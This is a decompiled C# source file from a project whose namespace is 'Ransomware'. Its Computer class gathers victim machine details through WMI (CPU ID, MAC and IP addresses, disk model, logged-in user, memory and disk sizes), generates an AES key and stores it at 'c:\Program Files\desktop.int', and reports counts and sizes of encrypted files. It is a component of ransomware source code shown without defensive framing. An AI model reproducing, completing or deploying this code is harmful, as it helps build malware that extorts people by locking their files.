using System;
using System.IO;
using System.Management;

namespace Ransomware;

public class Computer
{
	public string CpuID;

	public string MacAddress;

	public string DiskID;

	public string IpAddress;

	public string LoginUserName;

	public string ComputerName;

	public string SystemType;

	public string TotalPhysicalMemory;

	public string TotalDiskSize;

	public string TotalFreeSpace;

	private static Computer _instance;

	public static Computer Instance()
	{
		if (_instance == null)
		{
			_instance = new Computer();
		}
		return _instance;
	}

	public Computer()
	{
		CpuID = GetCpuID();
		MacAddress = GetMacAddress();
		DiskID = GetDiskID();
		IpAddress = GetIPAddress();
		LoginUserName = GetUserName();
		SystemType = GetSystemType();
		TotalPhysicalMemory = GetTotalPhysicalMemory();
		ComputerName = GetComputerName();
		TotalDiskSize = GetTotalDiskSize();
		TotalFreeSpace = GetTotalFreeSpace();
	}

	public string GetCpuID()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string result = "";
			ManagementClass val = new ManagementClass("Win32_Processor");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val2).get_Properties().get_Item("ProcessorId").get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			instances = null;
			val = null;
			return result;
		}
		catch
		{
			return "unknow";
		}
	}

	public string GetMacAddress()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string result = "";
			ManagementClass val = new ManagementClass("Win32_NetworkAdapterConfiguration");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val2).get_Item("IPEnabled"))
					{
						result = ((ManagementBaseObject)val2).get_Item("MacAddress").ToString();
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			instances = null;
			val = null;
			return result;
		}
		catch
		{
			return "unknow";
		}
	}

	public string GetIPAddress()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string result = "";
			ManagementClass val = new ManagementClass("Win32_NetworkAdapterConfiguration");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val2).get_Item("IPEnabled"))
					{
						Array array = (Array)((ManagementBaseObject)val2).get_Properties().get_Item("IpAddress").get_Value();
						result = array.GetValue(0)!.ToString();
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			instances = null;
			val = null;
			return result;
		}
		catch
		{
			return "unknow";
		}
	}

	public string GetDiskID()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string result = "";
			ManagementClass val = new ManagementClass("Win32_DiskDrive");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = (string)((ManagementBaseObject)val2).get_Properties().get_Item("Model").get_Value();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			instances = null;
			val = null;
			return result;
		}
		catch
		{
			return "unknow";
		}
	}

	public string GetUserName()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string result = "";
			ManagementClass val = new ManagementClass("Win32_ComputerSystem");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val2).get_Item("UserName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			instances = null;
			val = null;
			return result;
		}
		catch
		{
			return "unknow";
		}
	}

	public string GenHexKey()
	{
		try
		{
			string text = "";
			byte[] array = AES.generateKey();
			text = Convert.ToBase64String(array);
			File.WriteAllBytes("c:\\Program Files\\desktop.int", array);
			Console.Write("key转换为  64string： " + text);
			Console.WriteLine();
			return text;
		}
		catch
		{
			return "unknow";
		}
	}

	public string FindHexKey()
	{
		try
		{
			string text = "";
			if (File.Exists("c:\\Program Files\\desktop.int"))
			{
				byte[] inArray = File.ReadAllBytes("c:\\Program Files\\desktop.int");
				text = Convert.ToBase64String(inArray);
				Console.Write("找到了 key 并且转换为  64string： " + text);
				Console.WriteLine();
			}
			return text;
		}
		catch
		{
			return "unknow";
		}
	}

	public string GetSystemType()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string result = "";
			ManagementClass val = new ManagementClass("Win32_ComputerSystem");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val2).get_Item("SystemType").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			instances = null;
			val = null;
			return result;
		}
		catch
		{
			return "unknow";
		}
	}

	public string GetTotalPhysicalMemory()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string result = "";
			ManagementClass val = new ManagementClass("Win32_ComputerSystem");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val2).get_Item("TotalPhysicalMemory").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			instances = null;
			val = null;
			return result;
		}
		catch
		{
			return "unknow";
		}
	}

	public string GetTotalDiskSize()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			long num = 0L;
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				Console.Write(driveInfo.Name + "---" + driveInfo.DriveType);
				if (driveInfo.IsReady)
				{
					num += driveInfo.TotalSize / 1073741824L;
				}
			}
			return num.ToString();
		}
		catch
		{
			return "unknow";
		}
	}

	public string GetTotalFreeSpace()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			long num = 0L;
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				if (driveInfo.IsReady)
				{
					num += driveInfo.TotalFreeSpace / 1073741824L;
				}
			}
			return num.ToString();
		}
		catch
		{
			return "unknow";
		}
	}

	public string GetAllFileNumber()
	{
		try
		{
			return encryptInfo.allFileNumber.ToString();
		}
		catch
		{
			return "unknow";
		}
	}

	public string GetRunTime()
	{
		try
		{
			return "0";
		}
		catch
		{
			return "unknow";
		}
	}

	public string GetAllFileSize()
	{
		try
		{
			return encryptInfo.allFileSize.ToString();
		}
		catch
		{
			return "unknow";
		}
	}

	public string GetComputerName()
	{
		try
		{
			return Environment.GetEnvironmentVariable("ComputerName");
		}
		catch
		{
			return "unknow";
		}
	}
}
